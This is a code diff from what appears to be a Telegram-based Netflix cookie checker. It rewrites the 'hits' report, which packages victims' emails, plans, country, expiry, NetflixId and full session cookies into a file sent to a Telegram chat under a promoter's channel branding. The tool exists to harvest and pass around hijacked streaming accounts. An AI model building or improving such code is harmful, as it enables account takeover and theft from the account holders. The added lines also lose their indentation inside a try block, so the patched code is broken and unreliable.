@@ -760,17 +760,37 @@ def main():
                 # Generate and Send Summary File
                 if hits_list and send_file:
                     try:
-                        summary = f"========================================\nNETFLIX HITS SUMMARY\nAdmin: https://t.me/F88UF\nChannel: https://t.me/F88UF9844\n========================================\n\n"
-                        for res, cookie in hits_list:
-                            data = res.get("data", {})
-                            summary += f"Country: {res.get('country', 'Unknown')}\n"
-                            summary += f"Email: {data.get('email', 'N/A')}\n"
-                            summary += f"Plan: {data.get('plan', 'N/A')}\n"
-                            summary += f"Login: {res.get('link', 'N/A')}\n"
-                            summary += f"Cookie: {cookie}\n"
-                            summary += "-"*40 + "\n"
-                        summary += "\n========================================\nChecked by @F88UF | Join Channel: https://t.me/F88UF9844\n========================================"
-                        
+                        summary = "==============================\n"
+summary += "NETFLIX ACCOUNT DETAILS\n"
+summary += "==============================\n\n"
+
+for res, cookie in hits_list:
+    data = res.get("data", {})
+
+    netflix_id = "Not Found"
+    for part in cookie.split(";"):
+        if "NetflixId=" in part:
+            netflix_id = part.strip()
+            break
+
+    summary += f"Country : {res.get('country','Unknown')}\n"
+    summary += f"Email   : {data.get('email','N/A')}\n"
+    summary += f"Plan    : {data.get('plan','Unknown')}\n"
+    summary += f"Quality : {data.get('quality','Unknown')}\n"
+    summary += f"Expiry  : {data.get('expiry','N/A')}\n\n"
+
+    summary += "NETFLIX ID:\n"
+    summary += f"{netflix_id}\n\n"
+
+    summary += "FULL COOKIE:\n"
+    summary += f"{cookie}\n"
+
+    summary += "------------------------------\n"
+
+summary += "\n==============================\n"
+summary += "Checked by @F88UF\n"
+summary += "Join Channel: https://t.me/F88UF9844\n"
+summary += "==============================\n"
                         with io.BytesIO(summary.encode('utf-8')) as f:
                             f.name = f"Netflix_Hits_by_@F88UF_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                             bot.send_document(chat_id, f, caption="📂 **Hits File by @F88UF**")
